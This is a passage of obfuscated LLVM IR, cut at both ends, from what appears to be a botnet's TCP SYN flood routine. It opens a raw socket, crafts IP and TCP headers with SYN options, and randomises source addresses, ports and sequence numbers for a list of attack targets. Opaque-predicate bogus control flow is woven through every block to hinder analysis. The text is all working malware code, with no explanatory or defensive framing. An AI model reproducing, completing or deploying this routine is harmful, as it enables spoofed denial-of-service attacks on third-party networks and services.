  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_target*, align 8
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_option*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8**, align 8
  %22 = alloca i8, align 1
  %23 = alloca i16, align 2
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i16, align 2
  %27 = alloca i16, align 2
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca i8, align 1
  %35 = alloca i8, align 1
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca %struct.iphdr*, align 8
  %39 = alloca %struct.tcphdr*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca %struct.iphdr*, align 8
  %43 = alloca %struct.tcphdr*, align 8
  %44 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %14, align 4
  store i8 %1, i8* %15, align 1
  store %struct.attack_target* %2, %struct.attack_target** %16, align 8
  store i8 %3, i8* %17, align 1
  store %struct.attack_option* %4, %struct.attack_option** %18, align 8
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %45 = load i8, i8* %15, align 1
  %46 = zext i8 %45 to i64
  %47 = call noalias i8* @calloc(i64 %46, i64 8) #6
  %48 = bitcast i8* %47 to i8**
  store i8** %48, i8*** %21, align 8
  %49 = load i8, i8* %17, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 2, i32 0)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %22, align 1
  %53 = load i8, i8* %17, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 3, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %23, align 2
  %57 = load i8, i8* %17, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 4, i32 64)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %24, align 1
  %61 = load i8, i8* %17, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 5, i32 1)
  %64 = trunc i32 %63 to i8
  store i8 %64, i8* %25, align 1
  %65 = load i8, i8* %17, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 6, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %26, align 2
  %69 = load i8, i8* %17, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 7, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %27, align 2
  %73 = load i8, i8* %17, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 16, i32 65535)
  store i32 %75, i32* %28, align 4
  %76 = load i8, i8* %17, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 17, i32 0)
  store i32 %78, i32* %29, align 4
  %79 = load i8, i8* %17, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 10, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %30, align 1
  %83 = load i8, i8* %17, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 11, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %31, align 1
  %87 = load i8, i8* %17, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 12, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %32, align 1
  %91 = load i8, i8* %17, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 13, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %33, align 1
  %95 = load i8, i8* %17, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 14, i32 1)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %34, align 1
  %99 = load i8, i8* %17, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 15, i32 0)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %35, align 1
  %103 = load i8, i8* %17, align 1
  %104 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %105 = load i32, i32* @LOCAL_ADDR, align 4
  %106 = call i32 @attack_get_opt_ip(i8 zeroext %103, %struct.attack_option* %104, i8 zeroext 24, i32 %105)
  store i32 %106, i32* %36, align 4
  %107 = call i64 @time(i64* null) #6
  %108 = load i32, i32* %14, align 4
  %109 = sext i32 %108 to i64
  %110 = add nsw i64 %107, %109
  %111 = trunc i64 %110 to i32
  store i32 %111, i32* %37, align 4
  %112 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %112, i32* %20, align 4
  %113 = icmp eq i32 %112, -1
  %114 = load i32, i32* @x.23
  %115 = load i32, i32* @y.24
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %113, label %122, label %123

; <label>:122:                                    ; preds = %originalBBpart2
  br label %675

; <label>:123:                                    ; preds = %originalBBpart2
  %124 = load i32, i32* @x.23
  %125 = load i32, i32* @y.24
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB3, label %originalBB3alteredBB

originalBB3:                                      ; preds = %originalBB3alteredBB, %123
  store i32 1, i32* %19, align 4
  %132 = load i32, i32* %20, align 4
  %133 = bitcast i32* %19 to i8*
  %134 = call i32 @setsockopt(i32 %132, i32 0, i32 3, i8* %133, i32 4) #6
  %135 = icmp eq i32 %134, -1
  %136 = load i32, i32* @x.23
  %137 = load i32, i32* @y.24
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBBpart25, label %originalBB3alteredBB

originalBBpart25:                                 ; preds = %originalBB3
  br i1 %135, label %144, label %163

; <label>:144:                                    ; preds = %originalBBpart25
  %145 = load i32, i32* @x.23
  %146 = load i32, i32* @y.24
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %144
  %153 = load i32, i32* %20, align 4
  %154 = call i32 @close(i32 %153)
  %155 = load i32, i32* @x.23
  %156 = load i32, i32* @y.24
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br label %675

; <label>:163:                                    ; preds = %originalBBpart25
  store i32 0, i32* %19, align 4
  br label %164

; <label>:164:                                    ; preds = %357, %163
  %165 = load i32, i32* @x.23
  %166 = load i32, i32* @y.24
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %164
  %173 = load i32, i32* %19, align 4
  %174 = load i8, i8* %15, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  %177 = load i32, i32* @x.23
  %178 = load i32, i32* @y.24
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br i1 %176, label %185, label %360

; <label>:185:                                    ; preds = %originalBBpart213
  %186 = call noalias i8* @calloc(i64 128, i64 1) #6
  %187 = load i8**, i8*** %21, align 8
  %188 = load i32, i32* %19, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds i8*, i8** %187, i64 %189
  store i8* %186, i8** %190, align 8
  %191 = load i8**, i8*** %21, align 8
  %192 = load i32, i32* %19, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds i8*, i8** %191, i64 %193
  %195 = load i8*, i8** %194, align 8
  %196 = bitcast i8* %195 to %struct.iphdr*
  store %struct.iphdr* %196, %struct.iphdr** %38, align 8
  %197 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i64 1
  %199 = bitcast %struct.iphdr* %198 to %struct.tcphdr*
  store %struct.tcphdr* %199, %struct.tcphdr** %39, align 8
  %200 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i64 1
  %202 = bitcast %struct.tcphdr* %201 to i8*
  store i8* %202, i8** %40, align 8
  %203 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %204 = bitcast %struct.iphdr* %203 to i8*
  %205 = load i8, i8* %204, align 4
  %206 = and i8 %205, 15
  %207 = or i8 %206, 64
  store i8 %207, i8* %204, align 4
  %208 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %209 = bitcast %struct.iphdr* %208 to i8*
  %210 = load i8, i8* %209, align 4
  %211 = and i8 %210, -16
  %212 = or i8 %211, 5
  store i8 %212, i8* %209, align 4
  %213 = load i8, i8* %22, align 1
  %214 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 1
  store i8 %213, i8* %215, align 1
  %216 = call zeroext i16 @htons(i16 zeroext 60) #7
  %217 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 2
  store i16 %216, i16* %218, align 2
  %219 = load i16, i16* %23, align 2
  %220 = call zeroext i16 @htons(i16 zeroext %219) #7
  %221 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 3
  store i16 %220, i16* %222, align 4
  %223 = load i8, i8* %24, align 1
  %224 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 5
  store i8 %223, i8* %225, align 4
  %226 = load i8, i8* %25, align 1
  %227 = icmp ne i8 %226, 0
  br i1 %227, label %228, label %232

; <label>:228:                                    ; preds = %185
  %229 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %230 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 4
  store i16 %229, i16* %231, align 2
  br label %232

; <label>:232:                                    ; preds = %228, %185
  %233 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 6
  store i8 6, i8* %234, align 1
  %235 = load i32, i32* %36, align 4
  %236 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 8
  store i32 %235, i32* %237, align 4
  %238 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %239 = load i32, i32* %19, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %238, i64 %240
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %241, i32 0, i32 1
  %243 = load i32, i32* %242, align 4
  %244 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 9
  store i32 %243, i32* %245, align 4
  %246 = load i16, i16* %26, align 2
  %247 = call zeroext i16 @htons(i16 zeroext %246) #7
  %248 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  store i16 %247, i16* %249, align 4
  %250 = load i16, i16* %27, align 2
  %251 = call zeroext i16 @htons(i16 zeroext %250) #7
  %252 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 1
  store i16 %251, i16* %253, align 2
  %254 = load i32, i32* %28, align 4
  %255 = trunc i32 %254 to i16
  %256 = call zeroext i16 @htons(i16 zeroext %255) #7
  %257 = zext i16 %256 to i32
  %258 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 2
  store i32 %257, i32* %259, align 4
  %260 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = and i16 %262, -241
  %264 = or i16 %263, 160
  store i16 %264, i16* %261, align 4
  %265 = load i8, i8* %30, align 1
  %266 = sext i8 %265 to i16
  %267 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 4
  %269 = load i16, i16* %268, align 4
  %270 = and i16 %266, 1
  %271 = shl i16 %270, 13
  %272 = and i16 %269, -8193
  %273 = or i16 %272, %271
  store i16 %273, i16* %268, align 4
  %274 = load i8, i8* %31, align 1
  %275 = sext i8 %274 to i16
  %276 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %277 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %276, i32 0, i32 4
  %278 = load i16, i16* %277, align 4
  %279 = and i16 %275, 1
  %280 = shl i16 %279, 12
  %281 = and i16 %278, -4097
  %282 = or i16 %281, %280
  store i16 %282, i16* %277, align 4
  %283 = load i8, i8* %32, align 1
  %284 = sext i8 %283 to i16
  %285 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %286 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %285, i32 0, i32 4
  %287 = load i16, i16* %286, align 4
  %288 = and i16 %284, 1
  %289 = shl i16 %288, 11
  %290 = and i16 %287, -2049
  %291 = or i16 %290, %289
  store i16 %291, i16* %286, align 4
  %292 = load i8, i8* %33, align 1
  %293 = sext i8 %292 to i16
  %294 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %295 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %294, i32 0, i32 4
  %296 = load i16, i16* %295, align 4
  %297 = and i16 %293, 1
  %298 = shl i16 %297, 10
  %299 = and i16 %296, -1025
  %300 = or i16 %299, %298
  store i16 %300, i16* %295, align 4
  %301 = load i8, i8* %34, align 1
  %302 = sext i8 %301 to i16
  %303 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 4
  %305 = load i16, i16* %304, align 4
  %306 = and i16 %302, 1
  %307 = shl i16 %306, 9
  %308 = and i16 %305, -513
  %309 = or i16 %308, %307
  store i16 %309, i16* %304, align 4
  %310 = load i8, i8* %35, align 1
  %311 = sext i8 %310 to i16
  %312 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %313 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %312, i32 0, i32 4
  %314 = load i16, i16* %313, align 4
  %315 = and i16 %311, 1
  %316 = shl i16 %315, 8
  %317 = and i16 %314, -257
  %318 = or i16 %317, %316
  store i16 %318, i16* %313, align 4
  %319 = load i8*, i8** %40, align 8
  %320 = getelementptr inbounds i8, i8* %319, i32 1
  store i8* %320, i8** %40, align 8
  store i8 2, i8* %319, align 1
  %321 = load i8*, i8** %40, align 8
  %322 = getelementptr inbounds i8, i8* %321, i32 1
  store i8* %322, i8** %40, align 8
  store i8 4, i8* %321, align 1
  %323 = call i32 @rand_next()
  %324 = and i32 %323, 15
  %325 = add i32 1400, %324
  %326 = trunc i32 %325 to i16
  %327 = call zeroext i16 @htons(i16 zeroext %326) #7
  %328 = load i8*, i8** %40, align 8
  %329 = bitcast i8* %328 to i16*
  store i16 %327, i16* %329, align 2
  %330 = load i8*, i8** %40, align 8
  %331 = getelementptr inbounds i8, i8* %330, i64 2
  store i8* %331, i8** %40, align 8
  %332 = load i8*, i8** %40, align 8
  %333 = getelementptr inbounds i8, i8* %332, i32 1
  store i8* %333, i8** %40, align 8
  store i8 4, i8* %332, align 1
  %334 = load i8*, i8** %40, align 8
  %335 = getelementptr inbounds i8, i8* %334, i32 1
  store i8* %335, i8** %40, align 8
  store i8 2, i8* %334, align 1
  %336 = load i8*, i8** %40, align 8
  %337 = getelementptr inbounds i8, i8* %336, i32 1
  store i8* %337, i8** %40, align 8
  store i8 8, i8* %336, align 1
  %338 = load i8*, i8** %40, align 8
  %339 = getelementptr inbounds i8, i8* %338, i32 1
  store i8* %339, i8** %40, align 8
  store i8 10, i8* %338, align 1
  %340 = call i32 @rand_next()
  %341 = load i8*, i8** %40, align 8
  %342 = bitcast i8* %341 to i32*
  store i32 %340, i32* %342, align 4
  %343 = load i8*, i8** %40, align 8
  %344 = getelementptr inbounds i8, i8* %343, i64 4
  store i8* %344, i8** %40, align 8
  %345 = load i8*, i8** %40, align 8
  %346 = bitcast i8* %345 to i32*
  store i32 0, i32* %346, align 4
  %347 = load i8*, i8** %40, align 8
  %348 = getelementptr inbounds i8, i8* %347, i64 4
  store i8* %348, i8** %40, align 8
  %349 = load i8*, i8** %40, align 8
  %350 = getelementptr inbounds i8, i8* %349, i32 1
  store i8* %350, i8** %40, align 8
  store i8 1, i8* %349, align 1
  %351 = load i8*, i8** %40, align 8
  %352 = getelementptr inbounds i8, i8* %351, i32 1
  store i8* %352, i8** %40, align 8
  store i8 3, i8* %351, align 1
  %353 = load i8*, i8** %40, align 8
  %354 = getelementptr inbounds i8, i8* %353, i32 1
  store i8* %354, i8** %40, align 8
  store i8 3, i8* %353, align 1
  %355 = load i8*, i8** %40, align 8
  %356 = getelementptr inbounds i8, i8* %355, i32 1
  store i8* %356, i8** %40, align 8
  store i8 6, i8* %355, align 1
  br label %357

; <label>:357:                                    ; preds = %232
  %358 = load i32, i32* %19, align 4
  %359 = add nsw i32 %358, 1
  store i32 %359, i32* %19, align 4
  br label %164

; <label>:360:                                    ; preds = %originalBBpart213
  br label %361

; <label>:361:                                    ; preds = %674, %360
  store i32 0, i32* %19, align 4
  br label %362

; <label>:362:                                    ; preds = %originalBBpart277, %361
  %363 = load i32, i32* %19, align 4
  %364 = load i8, i8* %15, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp slt i32 %363, %365
  br i1 %366, label %367, label %652

; <label>:367:                                    ; preds = %362
  %368 = load i32, i32* @x.23
  %369 = load i32, i32* @y.24
  %370 = sub i32 %368, 1
  %371 = mul i32 %368, %370
  %372 = urem i32 %371, 2
  %373 = icmp eq i32 %372, 0
  %374 = icmp slt i32 %369, 10
  %375 = or i1 %373, %374
  br i1 %375, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %367
  %376 = load i8**, i8*** %21, align 8
  %377 = load i32, i32* %19, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds i8*, i8** %376, i64 %378
  %380 = load i8*, i8** %379, align 8
  store i8* %380, i8** %41, align 8
  %381 = load i8*, i8** %41, align 8
  %382 = bitcast i8* %381 to %struct.iphdr*
  store %struct.iphdr* %382, %struct.iphdr** %42, align 8
  %383 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i64 1
  %385 = bitcast %struct.iphdr* %384 to %struct.tcphdr*
  store %struct.tcphdr* %385, %struct.tcphdr** %43, align 8
  %386 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %387 = load i32, i32* %19, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %386, i64 %388
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %389, i32 0, i32 2
  %391 = load i8, i8* %390, align 4
  %392 = zext i8 %391 to i32
  %393 = icmp slt i32 %392, 32
  %394 = load i32, i32* @x.23
  %395 = load i32, i32* @y.24
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br i1 %393, label %402, label %423

; <label>:402:                                    ; preds = %originalBBpart217
  %403 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %404 = load i32, i32* %19, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %403, i64 %405
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i32 0, i32 1
  %408 = load i32, i32* %407, align 4
  %409 = call i32 @ntohl(i32 %408) #7
  %410 = call i32 @rand_next()
  %411 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %412 = load i32, i32* %19, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i64 %413
  %415 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i32 0, i32 2
  %416 = load i8, i8* %415, align 4
  %417 = zext i8 %416 to i32
  %418 = lshr i32 %410, %417
  %419 = add i32 %409, %418
  %420 = call i32 @htonl(i32 %419) #7
  %421 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 9
  store i32 %420, i32* %422, align 4
  br label %423

; <label>:423:                                    ; preds = %402, %originalBBpart217
  %424 = load i32, i32* %36, align 4
  %425 = icmp eq i32 %424, -1
  br i1 %425, label %426, label %446

; <label>:426:                                    ; preds = %423
  %427 = load i32, i32* @x.23
  %428 = load i32, i32* @y.24
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %426
  %435 = call i32 @rand_next()
  %436 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 8
  store i32 %435, i32* %437, align 4
  %438 = load i32, i32* @x.23
  %439 = load i32, i32* @y.24
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %446

; <label>:446:                                    ; preds = %originalBBpart221, %423
  %447 = load i32, i32* @x.23
  %448 = load i32, i32* @y.24
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %446
  %455 = load i16, i16* %23, align 2
  %456 = zext i16 %455 to i32
  %457 = icmp eq i32 %456, 65535
  %458 = load i32, i32* @x.23
  %459 = load i32, i32* @y.24
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %457, label %466, label %472

; <label>:466:                                    ; preds = %originalBBpart225
  %467 = call i32 @rand_next()
  %468 = and i32 %467, 65535
  %469 = trunc i32 %468 to i16
  %470 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 3
  store i16 %469, i16* %471, align 4
  br label %472

; <label>:472:                                    ; preds = %466, %originalBBpart225
  %473 = load i32, i32* @x.23
  %474 = load i32, i32* @y.24
  %475 = sub i32 %473, 1
  %476 = mul i32 %473, %475
  %477 = urem i32 %476, 2
  %478 = icmp eq i32 %477, 0
  %479 = icmp slt i32 %474, 10
  %480 = or i1 %478, %479
  br i1 %480, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %472
  %481 = load i16, i16* %26, align 2
  %482 = zext i16 %481 to i32
  %483 = icmp eq i32 %482, 65535
  %484 = load i32, i32* @x.23
  %485 = load i32, i32* @y.24
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br i1 %483, label %492, label %514

; <label>:492:                                    ; preds = %originalBBpart229
  %493 = load i32, i32* @x.23
  %494 = load i32, i32* @y.24
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %492
  %501 = call i32 @rand_next()
  %502 = and i32 %501, 65535
  %503 = trunc i32 %502 to i16
  %504 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %505 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %504, i32 0, i32 0
  store i16 %503, i16* %505, align 4
  %506 = load i32, i32* @x.23
  %507 = load i32, i32* @y.24
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBBpart248, label %originalBB31alteredBB

originalBBpart248:                                ; preds = %originalBB31
  br label %514

; <label>:514:                                    ; preds = %originalBBpart248, %originalBBpart229
  %515 = load i16, i16* %27, align 2
  %516 = zext i16 %515 to i32
  %517 = icmp eq i32 %516, 65535
  br i1 %517, label %518, label %524

; <label>:518:                                    ; preds = %514
  %519 = call i32 @rand_next()
  %520 = and i32 %519, 65535
  %521 = trunc i32 %520 to i16
  %522 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 1
  store i16 %521, i16* %523, align 2
  br label %524

; <label>:524:                                    ; preds = %518, %514
  %525 = load i32, i32* %28, align 4
  %526 = icmp eq i32 %525, 65535
  br i1 %526, label %527, label %547

; <label>:527:                                    ; preds = %524
  %528 = load i32, i32* @x.23
  %529 = load i32, i32* @y.24
  %530 = sub i32 %528, 1
  %531 = mul i32 %528, %530
  %532 = urem i32 %531, 2
  %533 = icmp eq i32 %532, 0
  %534 = icmp slt i32 %529, 10
  %535 = or i1 %533, %534
  br i1 %535, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %527
  %536 = call i32 @rand_next()
  %537 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %538 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %537, i32 0, i32 2
  store i32 %536, i32* %538, align 4
